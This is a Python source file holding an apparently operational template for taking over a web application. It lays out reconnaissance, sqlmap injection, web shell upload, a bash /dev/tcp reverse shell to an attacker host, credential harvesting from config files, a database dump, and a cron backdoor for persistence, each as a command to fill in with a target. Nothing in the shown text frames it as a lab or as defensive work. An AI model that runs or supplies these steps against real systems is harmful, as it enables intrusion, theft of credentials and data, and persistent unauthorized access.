"""
Web Application Attack Chain Templates
"""


class WebAppTemplates:
    """Templates for web application compromise scenarios"""
    
    @staticmethod
    def web_app_takeover_chain():
        """
        Complete attack chain for compromising web applications
        Target: Web applications with upload functionality or known vulnerabilities
        """
        return {
            'name': 'Web Application Takeover',
            'description': 'Complete attack chain for compromising web applications',
            'target_type': 'web_application',
            'difficulty': 'medium',
            'estimated_time': '2-4 hours',
            'phases': [
                WebAppTemplates._recon_phase(),
                WebAppTemplates._exploitation_phase(),
                WebAppTemplates._post_exploitation_phase()
            ]
        }
    
    @staticmethod
    def _recon_phase():
        """Reconnaissance phase for web applications"""
        return {
            'phase': 'reconnaissance',
            'name': 'Web Application Reconnaissance',
            'description': 'Gather information about target web application',
            'steps': [
                {
                    'step': 1,
                    'name': 'Subdomain Enumeration',
                    'tool': '01-reconnaissance/subdomain_enum.py',
                    'command': 'python3 01-reconnaissance/subdomain_enum.py {target_domain} 01-reconnaissance/wordlists/subdomains.txt',
                    'expected_output': 'List of subdomains',
                    'success_criteria': 'Found dev/staging/test subdomains',
                    'required_vars': ['target_domain']
                },
                {
                    'step': 2,
                    'name': 'Technology Fingerprinting',
                    'tool': '01-reconnaissance/tech_fingerprinter.py',
                    'command': 'python3 01-reconnaissance/tech_fingerprinter.py https://{target_domain}',
                    'expected_output': 'Web stack details',
                    'success_criteria': 'Identified CMS, frameworks, or vulnerable versions',
                    'required_vars': ['target_domain']
                },
                {
                    'step': 3,
                    'name': 'Google Dorking',
                    'tool': '01-reconnaissance/google_dorker.py',
                    'command': 'python3 01-reconnaissance/google_dorker.py {target_domain}',
                    'expected_output': 'Exposed files and directories',
                    'success_criteria': 'Found config files, backups, or admin panels',
                    'required_vars': ['target_domain']
                },
                {
                    'step': 4,
                    'name': 'Directory Bruteforcing',
                    'tool': 'dirb/gobuster',
                    'command': 'gobuster dir -u https://{target_domain} -w /usr/share/wordlists/dirb/common.txt',
                    'expected_output': 'Hidden directories and files',
                    'success_criteria': 'Found admin panels, upload directories, or sensitive files',
                    'required_vars': ['target_domain'],
                    'optional': True
                }
            ]
        }
    
    @staticmethod
    def _exploitation_phase():
        """Exploitation phase for web applications"""
        return {
            'phase': 'exploitation',
            'name': 'Web Application Exploitation',
            'description': 'Exploit identified vulnerabilities',
            'steps': [
                {
                    'step': 1,
                    'name': 'Vulnerability Scanning',
                    'tool': '04-exploitation/vulnerability_scanner.py',
                    'command': 'python3 04-exploitation/vulnerability_scanner.py https://{target_domain}',
                    'expected_output': 'List of vulnerabilities',
                    'success_criteria': 'Found SQLi, XSS, or RCE',
                    'required_vars': ['target_domain']
                },
                {
                    'step': 2,
                    'name': 'SQL Injection Testing',
                    'tool': 'sqlmap',
                    'command': 'sqlmap -u "https://{target_domain}{vulnerable_endpoint}" --batch --risk 2',
                    'expected_output': 'Database information',
                    'success_criteria': 'Confirmed SQL injection vulnerability',
                    'required_vars': ['target_domain', 'vulnerable_endpoint'],
                    'optional': True
                },
                {
                    'step': 3,
                    'name': 'Web Shell Upload',
                    'tool': '04-exploitation/webshell_uploader.py',
                    'command': 'python3 04-exploitation/webshell_uploader.py {target_domain} {upload_endpoint}',
                    'expected_output': 'Web shell URL',
                    'success_criteria': 'Successfully uploaded and accessed web shell',
                    'required_vars': ['target_domain', 'upload_endpoint']
                }
            ]
        }
    
    @staticmethod
    def _post_exploitation_phase():
        """Post-exploitation phase for web servers"""
        return {
            'phase': 'post_exploitation',
            'name': 'Web Server Post-Exploitation',
            'description': 'Establish persistent access and gather sensitive data',
            'steps': [
                {
                    'step': 1,
                    'name': 'Establish Reverse Shell',
                    'tool': 'web shell command',
                    'command': 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1',
                    'expected_output': 'Reverse shell connection',
                    'success_criteria': 'Stable shell obtained',
                    'required_vars': ['attacker_ip', 'attacker_port'],
                    'notes': 'Execute through web shell'
                },
                {
                    'step': 2,
                    'name': 'Enumerate Web Server',
                    'tool': '05-post-exploitation/situational_awareness.py',
                    'command': 'python3 05-post-exploitation/situational_awareness.py --quick',
                    'expected_output': 'System information',
                    'success_criteria': 'Identified OS, user, privileges',
                    'required_vars': []
                },
                {
                    'step': 3,
                    'name': 'Find Database Credentials',
                    'tool': '05-post-exploitation/credential_harvester.py',
                    'command': 'python3 05-post-exploitation/credential_harvester.py --web-config',
                    'expected_output': 'Database credentials',
                    'success_criteria': 'Found DB credentials in config files',
                    'required_vars': []
                },
                {
                    'step': 4,
                    'name': 'Dump Database',
                    'tool': 'mysql/psql',
                    'command': 'mysqldump -u{db_user} -p{db_pass} {db_name} > dump.sql',
                    'expected_output': 'Database dump',
                    'success_criteria': 'Extracted database contents',
                    'required_vars': ['db_user', 'db_pass', 'db_name'],
                    'notes': 'Use credentials from previous step'
                },
                {
                    'step': 5,
                    'name': 'Establish Persistence',
                    'tool': 'cron/systemd',
                    'command': 'echo "*/5 * * * * /tmp/backdoor.sh" | crontab -',
                    'expected_output': 'Cron job created',
                    'success_criteria': 'Persistent backdoor established',
                    'required_vars': [],
                    'optional': True
                }
            ]
        }